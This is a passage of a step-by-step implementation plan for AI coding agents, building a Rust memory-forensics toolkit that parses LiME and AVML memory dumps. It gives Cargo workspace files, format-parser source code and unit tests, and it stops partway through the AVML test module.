# memory-forensic Phase 1: Format Detection + String Analysis — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build the `memf-format` and `memf-strings` crates plus the `memf` CLI binary, enabling users to open LiME/AVML/raw memory dumps, extract and classify strings, run YARA-X rules, and classify pre-extracted string files from UAC collections.

**Architecture:** Two library crates (`memf-format` for physical memory providers, `memf-strings` for extraction + classification) plus a thin CLI binary. Format detection uses the `inventory` crate for compile-time plugin registration with confidence-based probing. String classification runs a pipeline of regex + YARA-X classifiers.

**Tech Stack:** Rust 2021, `thiserror` 2, `inventory` 0.3, `memmap2` 0.9, `snap` 1, `yara-x` 0.12, `regex` 1, `aho-corasick` 1, `clap` 4, `comfy-table` 7, `serde`/`serde_json` 1

---

## File Structure

```
~/src/memory-forensic/
├── Cargo.toml                          # workspace root
├── LICENSE                             # Apache-2.0
├── crates/
│   ├── memf-format/
│   │   ├── Cargo.toml
│   │   └── src/
│   │       ├── lib.rs                  # PhysicalMemoryProvider + FormatPlugin traits, PhysicalRange, Error, open_dump()
│   │       ├── lime.rs                 # LiME format: 32-byte header, range records
│   │       ├── avml.rs                 # AVML v2 format: 32-byte header, Snappy-compressed blocks
│   │       ├── raw.rs                  # Raw/padded format: contiguous dump, fallback
│   │       └── test_builders.rs        # LimeBuilder, AvmlBuilder for synthetic test fixtures
│   └── memf-strings/
│       ├── Cargo.toml
│       └── src/
│           ├── lib.rs                  # ClassifiedString, StringCategory, enums, pipeline entry
│           ├── extract.rs              # StringExtractor (ASCII, UTF-8, UTF-16LE from PhysicalMemoryProvider)
│           ├── classify.rs             # ClassifierPipeline, StringClassifier trait, inventory
│           ├── regex_classifier.rs     # RegexClassifier: URLs, IPs, emails, paths, crypto addresses
│           ├── yara_classifier.rs      # YaraClassifier: YARA-X rule scanning
│           └── from_file.rs            # from_strings_file(): parse pre-extracted string files
└── src/
    └── main.rs                         # memf CLI: info + strings subcommands
```

---

### Task 1: Workspace Scaffold

**Files:**
- Create: `~/src/memory-forensic/Cargo.toml`
- Create: `~/src/memory-forensic/LICENSE`
- Create: `~/src/memory-forensic/crates/memf-format/Cargo.toml`
- Create: `~/src/memory-forensic/crates/memf-format/src/lib.rs`
- Create: `~/src/memory-forensic/crates/memf-strings/Cargo.toml`
- Create: `~/src/memory-forensic/crates/memf-strings/src/lib.rs`
- Create: `~/src/memory-forensic/src/main.rs`

- [ ] **Step 1: Create workspace root Cargo.toml**

```toml
# ~/src/memory-forensic/Cargo.toml
[workspace]
resolver = "2"
members = [
    "crates/memf-format",
    "crates/memf-strings",
]

[workspace.package]
edition = "2021"
rust-version = "1.75"
license = "Apache-2.0"
repository = "https://github.com/h4x0r/memory-forensic"

[workspace.dependencies]
# Internal crates
memf-format  = { path = "crates/memf-format" }
memf-strings = { path = "crates/memf-strings" }

# Error handling
thiserror = "2"
anyhow = "1"

# Plugin registration
inventory = "0.3"

# I/O
memmap2 = "0.9"

# Compression
snap = "1"

# Pattern matching
regex = "1"
aho-corasick = "1"
yara-x = "0.12"

# Serialization
serde = { version = "1", features = ["derive"] }
serde_json = "1"

# CLI
clap = { version = "4", features = ["derive"] }
comfy-table = "7"

[workspace.lints.clippy]
pedantic = { level = "warn", priority = -1 }
# Allow common pedantic overrides
module_name_repetitions = "allow"
must_use_candidate = "allow"
missing_errors_doc = "allow"
missing_panics_doc = "allow"

# The CLI binary
[package]
name = "memf"
version = "0.1.0"
edition.workspace = true
rust-version.workspace = true
license.workspace = true

[[bin]]
name = "memf"
path = "src/main.rs"

[dependencies]
memf-format.workspace = true
memf-strings.workspace = true
anyhow.workspace = true
clap.workspace = true
comfy-table.workspace = true
serde_json.workspace = true

[lints]
workspace = true
```

- [ ] **Step 2: Create LICENSE file**

Copy the Apache-2.0 license text:

```bash
curl -sL https://www.apache.org/licenses/LICENSE-2.0.txt > ~/src/memory-forensic/LICENSE
```

- [ ] **Step 3: Create memf-format crate Cargo.toml**

```toml
# ~/src/memory-forensic/crates/memf-format/Cargo.toml
[package]
name = "memf-format"
version = "0.1.0"
description = "Physical memory dump format parsers for the memf forensics framework"
edition.workspace = true
rust-version.workspace = true
license.workspace = true

[dependencies]
thiserror.workspace = true
inventory.workspace = true
memmap2.workspace = true
snap.workspace = true

[lints]
workspace = true
```

- [ ] **Step 4: Create memf-format stub lib.rs**

```rust
// ~/src/memory-forensic/crates/memf-format/src/lib.rs
#![deny(unsafe_code)]
#![warn(missing_docs)]
//! Physical memory dump format parsers.
//!
//! Provides the [`PhysicalMemoryProvider`] trait for reading physical memory
//! from various dump formats (LiME, AVML, raw), plus confidence-based format
//! probing via [`FormatPlugin`] and the [`inventory`] crate.
```

- [ ] **Step 5: Create memf-strings crate Cargo.toml**

```toml
# ~/src/memory-forensic/crates/memf-strings/Cargo.toml
[package]
name = "memf-strings"
version = "0.1.0"
description = "String extraction, classification, and YARA-X scanning for memory forensics"
edition.workspace = true
rust-version.workspace = true
license.workspace = true

[dependencies]
memf-format.workspace = true
thiserror.workspace = true
inventory.workspace = true
regex.workspace = true
aho-corasick.workspace = true
yara-x.workspace = true

[lints]
workspace = true
```

- [ ] **Step 6: Create memf-strings stub lib.rs**

```rust
// ~/src/memory-forensic/crates/memf-strings/src/lib.rs
#![deny(unsafe_code)]
#![warn(missing_docs)]
//! String extraction and IoC classification for memory forensics.
//!
//! Extracts ASCII/UTF-8/UTF-16LE strings from physical memory dumps,
//! classifies them via regex and YARA-X rules, and supports loading
//! pre-extracted string files.
```

- [ ] **Step 7: Create CLI stub main.rs**

```rust
// ~/src/memory-forensic/src/main.rs
#![deny(unsafe_code)]

fn main() {
    println!("memf - memory forensics toolkit");
}
```

- [ ] **Step 8: Initialize git repo and verify build**

```bash
cd ~/src/memory-forensic
git init
echo '/target' > .gitignore
cargo build
```

Run: `cargo build`
Expected: Compiles with 0 errors

- [ ] **Step 9: Commit**

```bash
cd ~/src/memory-forensic
git add -A
git commit -m "feat: workspace scaffold with memf-format, memf-strings, and CLI stub"
```

---

### Task 2: memf-format — Core Traits and Error Types

**Files:**
- Modify: `~/src/memory-forensic/crates/memf-format/src/lib.rs`

- [ ] **Step 1: Write failing test for PhysicalRange**

```rust
// ~/src/memory-forensic/crates/memf-format/src/lib.rs
#![deny(unsafe_code)]
#![warn(missing_docs)]
//! Physical memory dump format parsers.

use std::path::Path;

/// Error type for memf-format operations.
#[derive(Debug, thiserror::Error)]
pub enum Error {
    /// I/O error reading the dump file.
    #[error("I/O error: {0}")]
    Io(#[from] std::io::Error),

    /// The dump format could not be identified.
    #[error("unknown dump format")]
    UnknownFormat,

    /// Multiple formats matched with similar confidence.
    #[error("ambiguous format: multiple plugins scored >= 50")]
    AmbiguousFormat,

    /// The dump file is corrupt or truncated.
    #[error("corrupt dump: {0}")]
    Corrupt(String),

    /// Snappy decompression error.
    #[error("decompression error: {0}")]
    Decompression(String),
}

/// A Result alias for memf-format.
pub type Result<T> = std::result::Result<T, Error>;

/// A contiguous range of physical memory present in the dump.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PhysicalRange {
    /// Start physical address (inclusive).
    pub start: u64,
    /// End physical address (exclusive).
    pub end: u64,
}

impl PhysicalRange {
    /// Number of bytes in this range.
    #[must_use]
    pub fn len(&self) -> u64 {
        self.end.saturating_sub(self.start)
    }

    /// Whether this range is empty.
    #[must_use]
    pub fn is_empty(&self) -> bool {
        self.len() == 0
    }

    /// Whether the given address falls within this range.
    #[must_use]
    pub fn contains_addr(&self, addr: u64) -> bool {
        addr >= self.start && addr < self.end
    }
}

/// A provider of physical memory from a dump file.
pub trait PhysicalMemoryProvider: Send + Sync {
    /// Read up to `buf.len()` bytes starting at physical address `addr`.
    /// Returns the number of bytes actually read (may be less if crossing a gap).
    fn read_phys(&self, addr: u64, buf: &mut [u8]) -> Result<usize>;

    /// Return all valid physical address ranges in the dump.
    fn ranges(&self) -> &[PhysicalRange];

    /// Total physical memory size (sum of all range lengths).
    fn total_size(&self) -> u64 {
        self.ranges().iter().map(PhysicalRange::len).sum()
    }

    /// Human-readable format name (e.g., "LiME", "AVML v2").
    fn format_name(&self) -> &str;
}

/// A plugin that can detect and open a specific dump format.
pub trait FormatPlugin: Send + Sync {
    /// Human-readable name for this format.
    fn name(&self) -> &str;

    /// Probe the first `header` bytes of a file. Return confidence 0–100.
    fn probe(&self, header: &[u8]) -> u8;

    /// Open the file and return a `PhysicalMemoryProvider`.
    fn open(&self, path: &Path) -> Result<Box<dyn PhysicalMemoryProvider>>;
}

inventory::collect!(&'static dyn FormatPlugin);

/// Open a dump file by probing all registered format plugins.
///
/// Reads the first 4096 bytes and asks each plugin for a confidence score.
/// Returns the provider from the highest-confidence plugin (>=80 returns
/// immediately; otherwise the best score >=50 wins).
pub fn open_dump(path: &Path) -> Result<Box<dyn PhysicalMemoryProvider>> {
    use std::io::Read as _;
    let mut file = std::fs::File::open(path)?;
    let mut header = [0u8; 4096];
    let n = file.read(&mut header)?;
    let header = &header[..n];

    let mut best: Option<(&dyn FormatPlugin, u8)> = None;
    let mut ambiguous = false;

    for plugin in inventory::iter::<&dyn FormatPlugin> {
        let score = plugin.probe(header);
        if score >= 80 {
            return plugin.open(path);
        }
        if score >= 50 {
            if let Some((_, prev_score)) = best {
                if score >= prev_score {
                    if score == prev_score {
                        ambiguous = true;
                    } else {
                        ambiguous = false;
                        best = Some((*plugin, score));
                    }
                }
            } else {
                best = Some((*plugin, score));
            }
        } else if score >= 20 && best.is_none() {
            best = Some((*plugin, score));
        }
    }

    if ambiguous {
        return Err(Error::AmbiguousFormat);
    }

    match best {
        Some((plugin, _)) => plugin.open(path),
        None => Err(Error::UnknownFormat),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn physical_range_len() {
        let r = PhysicalRange { start: 0x1000, end: 0x2000 };
        assert_eq!(r.len(), 0x1000);
    }

    #[test]
    fn physical_range_empty() {
        let r = PhysicalRange { start: 0x1000, end: 0x1000 };
        assert!(r.is_empty());
    }

    #[test]
    fn physical_range_contains() {
        let r = PhysicalRange { start: 0x1000, end: 0x2000 };
        assert!(r.contains_addr(0x1000));
        assert!(r.contains_addr(0x1FFF));
        assert!(!r.contains_addr(0x2000));
        assert!(!r.contains_addr(0x0FFF));
    }
}
```

- [ ] **Step 2: Run tests to verify they pass**

Run: `cargo test -p memf-format`
Expected: 3 tests pass

- [ ] **Step 3: Commit**

```bash
cd ~/src/memory-forensic
git add crates/memf-format/src/lib.rs
git commit -m "feat(memf-format): core traits, error types, and open_dump orchestrator"
```

---

### Task 3: memf-format — LiME Format Provider

**Files:**
- Create: `~/src/memory-forensic/crates/memf-format/src/lime.rs`
- Create: `~/src/memory-forensic/crates/memf-format/src/test_builders.rs`
- Modify: `~/src/memory-forensic/crates/memf-format/src/lib.rs`

**Reference:** LiME header is 32 bytes per range record:
- Offset 0x00: magic `0x4C694D45` (4 bytes, LE — on disk: `45 4D 69 4C`)
- Offset 0x04: version = 1 (4 bytes, LE)
- Offset 0x08: s_addr (8 bytes, LE) — physical start address
- Offset 0x10: e_addr (8 bytes, LE) — physical end address (inclusive!)
- Offset 0x18: reserved (8 bytes, zeros)
- Followed by `(e_addr - s_addr + 1)` bytes of raw memory data
- Next record starts immediately after

- [ ] **Step 1: Write test builder + failing tests**

```rust
// ~/src/memory-forensic/crates/memf-format/src/test_builders.rs
//! Synthetic test fixture builders for dump formats.

/// Builder for creating synthetic LiME dumps in memory.
pub struct LimeBuilder {
    ranges: Vec<(u64, Vec<u8>)>,
}

impl LimeBuilder {
    /// Create a new empty LiME builder.
    #[must_use]
    pub fn new() -> Self {
        Self { ranges: Vec::new() }
    }

    /// Add a physical memory range with the given start address and data.
    #[must_use]
    pub fn add_range(mut self, start: u64, data: &[u8]) -> Self {
        self.ranges.push((start, data.to_vec()));
        self
    }

    /// Build the LiME dump as a byte vector.
    #[must_use]
    pub fn build(self) -> Vec<u8> {
        let mut out = Vec::new();
        for (start, data) in &self.ranges {
            let end = start + data.len() as u64 - 1; // LiME end is inclusive
            // magic
            out.extend_from_slice(&0x4C69_4D45_u32.to_le_bytes());
            // version
            out.extend_from_slice(&1_u32.to_le_bytes());
            // s_addr
            out.extend_from_slice(&start.to_le_bytes());
            // e_addr (inclusive)
            out.extend_from_slice(&end.to_le_bytes());
            // reserved
            out.extend_from_slice(&[0u8; 8]);
            // raw data
            out.extend_from_slice(data);
        }
        out
    }
}

impl Default for LimeBuilder {
    fn default() -> Self {
        Self::new()
    }
}

/// Builder for creating synthetic AVML v2 dumps in memory.
pub struct AvmlBuilder {
    ranges: Vec<(u64, Vec<u8>)>,
}

impl AvmlBuilder {
    /// Create a new empty AVML builder.
    #[must_use]
    pub fn new() -> Self {
        Self { ranges: Vec::new() }
    }

    /// Add a physical memory range with the given start address and data.
    #[must_use]
    pub fn add_range(mut self, start: u64, data: &[u8]) -> Self {
        self.ranges.push((start, data.to_vec()));
        self
    }

    /// Build the AVML v2 dump as a byte vector.
    ///
    /// Each range: 32-byte header + Snappy-compressed payload + 8 trailing bytes (uncompressed size).
    #[must_use]
    pub fn build(self) -> Vec<u8> {
        let mut out = Vec::new();
        for (start, data) in &self.ranges {
            let end = start + data.len() as u64; // AVML end is exclusive
            let compressed = snap::raw::Encoder::new().compress_vec(data).expect("snappy compress");
            // magic
            out.extend_from_slice(&0x4C4D_5641_u32.to_le_bytes());
            // version
            out.extend_from_slice(&2_u32.to_le_bytes());
            // start address
            out.extend_from_slice(&start.to_le_bytes());
            // end address (exclusive)
            out.extend_from_slice(&end.to_le_bytes());
            // reserved
            out.extend_from_slice(&[0u8; 8]);
            // Snappy-compressed data
            out.extend_from_slice(&compressed);
            // trailing 8 bytes: uncompressed size as u64 LE
            out.extend_from_slice(&(data.len() as u64).to_le_bytes());
        }
        out
    }
}

impl Default for AvmlBuilder {
    fn default() -> Self {
        Self::new()
    }
}
```

Now write the LiME tests:

```rust
// ~/src/memory-forensic/crates/memf-format/src/lime.rs
//! LiME (Linux Memory Extractor) format provider.
//!
//! LiME dumps consist of consecutive range records, each with a 32-byte header
//! followed by raw physical memory data.

use crate::{Error, FormatPlugin, PhysicalMemoryProvider, PhysicalRange, Result};
use std::path::Path;

/// LiME magic number: `0x4C694D45` (LE bytes on disk: `45 4D 69 4C`).
const LIME_MAGIC: u32 = 0x4C69_4D45;
/// LiME header size per range record.
const LIME_HEADER_SIZE: usize = 32;

/// Parsed LiME range record (header fields).
#[derive(Debug, Clone)]
struct LimeRecord {
    /// Physical start address.
    start: u64,
    /// Physical end address (inclusive in LiME format).
    end_inclusive: u64,
    /// Byte offset in the file where the raw data begins (after header).
    data_file_offset: u64,
}

impl LimeRecord {
    /// Number of data bytes for this range.
    fn data_len(&self) -> u64 {
        self.end_inclusive - self.start + 1
    }
}

/// Physical memory provider for LiME dumps.
pub struct LimeProvider {
    data: Vec<u8>,
    records: Vec<LimeRecord>,
    ranges: Vec<PhysicalRange>,
}

impl LimeProvider {
    /// Open a LiME dump from raw bytes (for testing).
    pub fn from_bytes(bytes: &[u8]) -> Result<Self> {
        let records = Self::parse_records(bytes)?;
        let ranges = records
            .iter()
            .map(|r| PhysicalRange {
                start: r.start,
                end: r.end_inclusive + 1, // convert to exclusive
            })
            .collect();
        Ok(Self {
            data: bytes.to_vec(),
            records,
            ranges,
        })
    }

    /// Open a LiME dump from a file path.
    pub fn from_path(path: &Path) -> Result<Self> {
        let data = std::fs::read(path)?;
        let records = Self::parse_records(&data)?;
        let ranges = records
            .iter()
            .map(|r| PhysicalRange {
                start: r.start,
                end: r.end_inclusive + 1,
            })
            .collect();
        Ok(Self {
            data,
            records,
            ranges,
        })
    }

    fn parse_records(data: &[u8]) -> Result<Vec<LimeRecord>> {
        let mut records = Vec::new();
        let mut offset = 0usize;

        while offset + LIME_HEADER_SIZE <= data.len() {
            let magic = u32::from_le_bytes(
                data[offset..offset + 4]
                    .try_into()
                    .map_err(|_| Error::Corrupt("truncated LiME header".into()))?,
            );
            if magic != LIME_MAGIC {
                return Err(Error::Corrupt(format!(
                    "bad LiME magic at offset {offset:#x}: {magic:#010x}"
                )));
            }

            let version = u32::from_le_bytes(
                data[offset + 4..offset + 8]
                    .try_into()
                    .map_err(|_| Error::Corrupt("truncated version".into()))?,
            );
            if version != 1 {
                return Err(Error::Corrupt(format!("unsupported LiME version: {version}")));
            }

            let s_addr = u64::from_le_bytes(
                data[offset + 8..offset + 16]
                    .try_into()
                    .map_err(|_| Error::Corrupt("truncated s_addr".into()))?,
            );
            let e_addr = u64::from_le_bytes(
                data[offset + 16..offset + 24]
                    .try_into()
                    .map_err(|_| Error::Corrupt("truncated e_addr".into()))?,
            );

            if e_addr < s_addr {
                return Err(Error::Corrupt(format!(
                    "e_addr ({e_addr:#x}) < s_addr ({s_addr:#x})"
                )));
            }

            let data_file_offset = (offset + LIME_HEADER_SIZE) as u64;
            let data_len = e_addr - s_addr + 1;

            if (offset + LIME_HEADER_SIZE) as u64 + data_len > data.len() as u64 {
                return Err(Error::Corrupt(format!(
                    "range at {s_addr:#x} extends beyond file"
                )));
            }

            records.push(LimeRecord {
                start: s_addr,
                end_inclusive: e_addr,
                data_file_offset,
            });

            offset = (data_file_offset + data_len) as usize;
        }

        if records.is_empty() {
            return Err(Error::Corrupt("no LiME range records found".into()));
        }

        Ok(records)
    }
}

impl PhysicalMemoryProvider for LimeProvider {
    fn read_phys(&self, addr: u64, buf: &mut [u8]) -> Result<usize> {
        for rec in &self.records {
            if addr >= rec.start && addr <= rec.end_inclusive {
                let offset_in_range = addr - rec.start;
                let available = rec.data_len() - offset_in_range;
                let to_read = buf.len().min(available as usize);
                let file_start = rec.data_file_offset as usize + offset_in_range as usize;
                buf[..to_read].copy_from_slice(&self.data[file_start..file_start + to_read]);
                return Ok(to_read);
            }
        }
        Ok(0) // address not in any range
    }

    fn ranges(&self) -> &[PhysicalRange] {
        &self.ranges
    }

    fn format_name(&self) -> &str {
        "LiME"
    }
}

/// LiME format plugin for the probing system.
struct LimePlugin;

impl FormatPlugin for LimePlugin {
    fn name(&self) -> &str {
        "LiME"
    }

    fn probe(&self, header: &[u8]) -> u8 {
        if header.len() < 8 {
            return 0;
        }
        let magic = u32::from_le_bytes([header[0], header[1], header[2], header[3]]);
        let version = u32::from_le_bytes([header[4], header[5], header[6], header[7]]);
        if magic == LIME_MAGIC && version == 1 {
            90
        } else {
            0
        }
    }

    fn open(&self, path: &Path) -> Result<Box<dyn PhysicalMemoryProvider>> {
        Ok(Box::new(LimeProvider::from_path(path)?))
    }
}

inventory::submit!(&LimePlugin as &dyn FormatPlugin);

#[cfg(test)]
mod tests {
    use super::*;
    use crate::test_builders::LimeBuilder;

    #[test]
    fn probe_lime_magic() {
        let plugin = LimePlugin;
        let dump = LimeBuilder::new()
            .add_range(0, &[0xAA; 64])
            .build();
        assert_eq!(plugin.probe(&dump[..64]), 90);
    }

    #[test]
    fn probe_non_lime() {
        let plugin = LimePlugin;
        assert_eq!(plugin.probe(&[0; 64]), 0);
    }

    #[test]
    fn single_range() {
        let data = vec![0xDE, 0xAD, 0xBE, 0xEF, 0x01, 0x02, 0x03, 0x04];
        let dump = LimeBuilder::new()
            .add_range(0x1000, &data)
            .build();
        let provider = LimeProvider::from_bytes(&dump).unwrap();

        assert_eq!(provider.ranges().len(), 1);
        assert_eq!(provider.ranges()[0].start, 0x1000);
        assert_eq!(provider.ranges()[0].end, 0x1008);
        assert_eq!(provider.total_size(), 8);
        assert_eq!(provider.format_name(), "LiME");

        let mut buf = [0u8; 4];
        let n = provider.read_phys(0x1000, &mut buf).unwrap();
        assert_eq!(n, 4);
        assert_eq!(buf, [0xDE, 0xAD, 0xBE, 0xEF]);
    }

    #[test]
    fn two_ranges() {
        let dump = LimeBuilder::new()
            .add_range(0x0000, &[0xAA; 4096])
            .add_range(0x10_0000, &[0xBB; 4096])
            .build();
        let provider = LimeProvider::from_bytes(&dump).unwrap();

        assert_eq!(provider.ranges().len(), 2);
        assert_eq!(provider.total_size(), 8192);

        let mut buf = [0u8; 4];
        provider.read_phys(0x0000, &mut buf).unwrap();
        assert_eq!(buf, [0xAA; 4]);

        provider.read_phys(0x10_0000, &mut buf).unwrap();
        assert_eq!(buf, [0xBB; 4]);
    }

    #[test]
    fn read_gap_returns_zero() {
        let dump = LimeBuilder::new()
            .add_range(0x1000, &[0xAA; 64])
            .build();
        let provider = LimeProvider::from_bytes(&dump).unwrap();

        let mut buf = [0u8; 4];
        let n = provider.read_phys(0x0000, &mut buf).unwrap();
        assert_eq!(n, 0);
    }

    #[test]
    fn read_crosses_range_boundary() {
        let dump = LimeBuilder::new()
            .add_range(0x1000, &[0xCC; 8])
            .build();
        let provider = LimeProvider::from_bytes(&dump).unwrap();

        let mut buf = [0u8; 16]; // ask for 16 bytes but only 8 available
        let n = provider.read_phys(0x1000, &mut buf).unwrap();
        assert_eq!(n, 8);
        assert_eq!(&buf[..8], &[0xCC; 8]);
    }

    #[test]
    fn corrupt_magic_errors() {
        let mut dump = LimeBuilder::new()
            .add_range(0, &[0; 64])
            .build();
        dump[0] = 0xFF; // corrupt magic
        assert!(LimeProvider::from_bytes(&dump).is_err());
    }

    #[test]
    fn truncated_header_errors() {
        assert!(LimeProvider::from_bytes(&[0x45, 0x4D, 0x69, 0x4C]).is_err());
    }
}
```

- [ ] **Step 2: Register modules in lib.rs**

Add to the end of `~/src/memory-forensic/crates/memf-format/src/lib.rs`:

```rust
pub mod lime;
pub mod test_builders;
```

- [ ] **Step 3: Run tests to verify they pass**

Run: `cargo test -p memf-format`
Expected: 10 tests pass (3 from lib.rs + 7 from lime.rs)

- [ ] **Step 4: Commit**

```bash
cd ~/src/memory-forensic
git add crates/memf-format/src/
git commit -m "feat(memf-format): LiME provider with LimeBuilder test fixtures"
```

---

### Task 4: memf-format — AVML v2 Format Provider

**Files:**
- Create: `~/src/memory-forensic/crates/memf-format/src/avml.rs`
- Modify: `~/src/memory-forensic/crates/memf-format/src/lib.rs`

**Reference:** AVML v2 header is 32 bytes per block:
- Offset 0x00: magic `0x4C4D5641` (4 bytes, LE — on disk: `41 56 4D 4C`)
- Offset 0x04: version = 2 (4 bytes, LE)
- Offset 0x08: start address (8 bytes, LE)
- Offset 0x10: end address (8 bytes, LE, exclusive)
- Offset 0x18: reserved (8 bytes, zeros)
- Followed by: Snappy-compressed payload (raw Snappy, not framed)
- Followed by: 8 trailing bytes = uncompressed data size as u64 LE

- [ ] **Step 1: Write AVML provider + tests**

```rust
// ~/src/memory-forensic/crates/memf-format/src/avml.rs
//! AVML v2 (Azure Virtual Machine Live) format provider.
//!
//! AVML v2 dumps consist of consecutive block records, each with a 32-byte
//! header, Snappy-compressed payload, and 8 trailing bytes for the
//! uncompressed size.

use crate::{Error, FormatPlugin, PhysicalMemoryProvider, PhysicalRange, Result};
use std::path::Path;

/// AVML magic number: `0x4C4D5641` (LE bytes on disk: `41 56 4D 4C`).
const AVML_MAGIC: u32 = 0x4C4D_5641;
/// AVML header size per block.
const AVML_HEADER_SIZE: usize = 32;
/// Trailing size field after compressed data.
const AVML_TRAILER_SIZE: usize = 8;

/// Parsed AVML block metadata.
#[derive(Debug, Clone)]
struct AvmlBlock {
    start: u64,
    end: u64, // exclusive
    /// Decompressed data for this block.
    data: Vec<u8>,
}

/// Physical memory provider for AVML v2 dumps.
pub struct AvmlProvider {
    blocks: Vec<AvmlBlock>,
    ranges: Vec<PhysicalRange>,
}

impl AvmlProvider {
    /// Open an AVML v2 dump from raw bytes (for testing).
    pub fn from_bytes(bytes: &[u8]) -> Result<Self> {
        let blocks = Self::parse_blocks(bytes)?;
        let ranges = blocks
            .iter()
            .map(|b| PhysicalRange {
                start: b.start,
                end: b.end,
            })
            .collect();
        Ok(Self { blocks, ranges })
    }

    /// Open an AVML v2 dump from a file path.
    pub fn from_path(path: &Path) -> Result<Self> {
        let data = std::fs::read(path)?;
        Self::from_bytes(&data)
    }

    fn parse_blocks(data: &[u8]) -> Result<Vec<AvmlBlock>> {
        let mut blocks = Vec::new();
        let mut offset = 0usize;

        while offset + AVML_HEADER_SIZE <= data.len() {
            let magic = u32::from_le_bytes(
                data[offset..offset + 4]
                    .try_into()
                    .map_err(|_| Error::Corrupt("truncated AVML header".into()))?,
            );
            if magic != AVML_MAGIC {
                return Err(Error::Corrupt(format!(
                    "bad AVML magic at offset {offset:#x}: {magic:#010x}"
                )));
            }

            let version = u32::from_le_bytes(
                data[offset + 4..offset + 8]
                    .try_into()
                    .map_err(|_| Error::Corrupt("truncated version".into()))?,
            );
            if version != 2 {
                return Err(Error::Corrupt(format!("unsupported AVML version: {version}")));
            }

            let start = u64::from_le_bytes(
                data[offset + 8..offset + 16]
                    .try_into()
                    .map_err(|_| Error::Corrupt("truncated start".into()))?,
            );
            let end = u64::from_le_bytes(
                data[offset + 16..offset + 24]
                    .try_into()
                    .map_err(|_| Error::Corrupt("truncated end".into()))?,
            );

            if end <= start {
                return Err(Error::Corrupt(format!(
                    "end ({end:#x}) <= start ({start:#x})"
                )));
            }

            let uncompressed_size = end - start;
            let payload_start = offset + AVML_HEADER_SIZE;

            // Find the trailing size field: scan from the end of the remaining data.
            // The trailer is the last 8 bytes before the next header or EOF.
            // We know uncompressed_size, so we can look for the trailer.
            // Strategy: the trailer stores uncompressed_size as u64 LE.
            // We search backwards from a reasonable max compressed size.
            let remaining = &data[payload_start..];
            let trailer_value = uncompressed_size;

            // Find the trailer by scanning for the u64 LE value
            let trailer_bytes = trailer_value.to_le_bytes();
            let mut trailer_pos = None;
            // The compressed data cannot be larger than uncompressed + overhead
            let max_search = remaining.len().min(uncompressed_size as usize + 1024);
            for i in (AVML_TRAILER_SIZE..=max_search).rev() {
                if i <= remaining.len() && remaining[i - AVML_TRAILER_SIZE..i] == trailer_bytes {
                    trailer_pos = Some(i - AVML_TRAILER_SIZE);
                    break;
                }
            }

            let trailer_offset = trailer_pos.ok_or_else(|| {
                Error::Corrupt("cannot find AVML trailer size field".into())
            })?;

            let compressed = &remaining[..trailer_offset];
            let decompressed = snap::raw::Decoder::new()
                .decompress_vec(compressed)
                .map_err(|e| Error::Decompression(e.to_string()))?;

            if decompressed.len() as u64 != uncompressed_size {
                return Err(Error::Corrupt(format!(
                    "decompressed size {} != expected {uncompressed_size}",
                    decompressed.len()
                )));
            }

            blocks.push(AvmlBlock {
                start,
                end,
                data: decompressed,
            });

            offset = payload_start + trailer_offset + AVML_TRAILER_SIZE;
        }

        if blocks.is_empty() {
            return Err(Error::Corrupt("no AVML blocks found".into()));
        }

        Ok(blocks)
    }
}

impl PhysicalMemoryProvider for AvmlProvider {
    fn read_phys(&self, addr: u64, buf: &mut [u8]) -> Result<usize> {
        for block in &self.blocks {
            if addr >= block.start && addr < block.end {
                let offset_in_block = (addr - block.start) as usize;
                let available = block.data.len() - offset_in_block;
                let to_read = buf.len().min(available);
                buf[..to_read]
                    .copy_from_slice(&block.data[offset_in_block..offset_in_block + to_read]);
                return Ok(to_read);
            }
        }
        Ok(0)
    }

    fn ranges(&self) -> &[PhysicalRange] {
        &self.ranges
    }

    fn format_name(&self) -> &str {
        "AVML v2"
    }
}

/// AVML v2 format plugin for the probing system.
struct AvmlPlugin;

impl FormatPlugin for AvmlPlugin {
    fn name(&self) -> &str {
        "AVML v2"
    }

    fn probe(&self, header: &[u8]) -> u8 {
        if header.len() < 8 {
            return 0;
        }
        let magic = u32::from_le_bytes([header[0], header[1], header[2], header[3]]);
        let version = u32::from_le_bytes([header[4], header[5], header[6], header[7]]);
        if magic == AVML_MAGIC && version == 2 {
            90
        } else {
            0
        }
    }

    fn open(&self, path: &Path) -> Result<Box<dyn PhysicalMemoryProvider>> {
        Ok(Box::new(AvmlProvider::from_path(path)?))
    }
}

inventory::submit!(&AvmlPlugin as &dyn FormatPlugin);

#[cfg(test)]
mod tests {
    use super::*;
    use crate::test_builders::AvmlBuilder;

    #[test]
    fn probe_avml_magic() {
        let plugin = AvmlPlugin;
        let dump = AvmlBuilder::new()
            .add_range(0, &[0xAA; 64])
            .build();
        assert_eq!(plugin.probe(&dump[..64.min(dump.len())]), 90);
    }

    #[test]
    fn probe_non_avml() {
        let plugin = AvmlPlugin;
        assert_eq!(plugin.probe(&[0; 64]), 0);
    }

    #[test]
    fn single_range_roundtrip() {
        let original = vec![0xDE, 0xAD, 0xBE, 0xEF, 0x01, 0x02, 0x03, 0x04];
        let dump = AvmlBuilder::new()
            .add_range(0x2000, &original)
            .build();
        let provider = AvmlProvider::from_bytes(&dump).unwrap();

        assert_eq!(provider.ranges().len(), 1);
        assert_eq!(provider.ranges()[0].start, 0x2000);
        assert_eq!(provider.ranges()[0].end, 0x2008);
        assert_eq!(provider.total_size(), 8);
        assert_eq!(provider.format_name(), "AVML v2");

        let mut buf = [0u8; 8];
        let n = provider.read_phys(0x2000, &mut buf).unwrap();
        assert_eq!(n, 8);
        assert_eq!(buf, original.as_slice());
    }

    #[test]
    fn two_ranges_roundtrip() {
        let dump = AvmlBuilder::new()
            .add_range(0x0000, &[0xAA; 256])
            .add_range(0x10_0000, &[0xBB; 256])
            .build();
        let provider = AvmlProvider::from_bytes(&dump).unwrap();

        assert_eq!(provider.ranges().len(), 2);
        assert_eq!(provider.total_size(), 512);

        let mut buf = [0u8; 4];
        provider.read_phys(0x0000, &mut buf).unwrap();
        assert_eq!(buf, [0xAA; 4]);

        provider.read_phys(0x10_0000, &mut buf).unwrap();
        assert_eq!(buf, [0xBB; 4]);
    }

    #[test]
    fn gap_returns_zero() {
        let dump = AvmlBuilder::new()
            .add_range(0x5000, &[0xCC; 64])
            .build();
